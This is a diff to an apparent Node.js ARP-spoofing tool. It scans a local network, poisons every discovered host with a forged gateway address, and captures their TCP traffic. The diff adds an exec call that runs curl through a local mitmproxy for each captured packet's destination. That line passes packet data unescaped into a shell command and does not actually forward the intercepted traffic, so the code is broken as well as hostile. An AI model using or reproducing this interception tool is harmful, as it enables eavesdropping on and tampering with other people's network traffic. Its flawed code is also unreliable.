@@ -2,6 +2,7 @@ const raw = require('raw-socket');
 const pcap = require('pcap');
 const ping = require('node-net-ping');
 const os = require('os');
+const { exec } = require('child_process');
 
 // Function to get the network interface IP address
 function getLocalIP(interfaceName) {
@@ -92,19 +93,20 @@ function sendArpPacket(interface, targetIp, targetMac, spoofIp, spoofMac) {
     });
 }
 
-// Function to capture and log packets
+// Function to capture and redirect packets to mitmproxy
 function capturePackets(interfaceName) {
     const pcapSession = pcap.createSession(interfaceName, "ip proto \\tcp");
     console.log('Packet capture started on interface:', interfaceName);
 
     pcapSession.on('packet', (rawPacket) => {
         const packet = pcap.decode.packet(rawPacket);
-        console.log(JSON.stringify(packet, null, 2));
+        // Redirect packet to mitmproxy
+        exec(`curl -k --proxy http://localhost:8080 ${packet.link.ip.dst}`);
     });
 }
 
 // Get the local IP and network interface
-const interfaceName = 'eth0'; // Replace with your network interface name
+const interfaceName = 'YOUR_INTERFACE_NAME'; // Replace with your network interface name
 const localIP = getLocalIP(interfaceName);
 if (!localIP) {
     console.error('Unable to determine local IP address.');
@@ -120,8 +122,8 @@ scanNetwork(network, interfaceName)
         console.log('Active hosts:', hosts);
 
         // Perform ARP spoofing on each identified host
-        const spoofIp = '192.168.1.1'; // IP address to spoof (usually the gateway)
-        const spoofMac = '00:11:22:33:44:55'; // Your MAC address
+        const spoofIp = 'YOUR_GATEWAY_IP'; // IP address to spoof (usually the gateway)
+        const spoofMac = 'YOUR_MAC_ADDRESS'; // Your MAC address
         const targetMac = 'ff:ff:ff:ff:ff:ff'; // Broadcast MAC address, replace with actual MAC if known
 
         hosts.forEach(targetIp => {
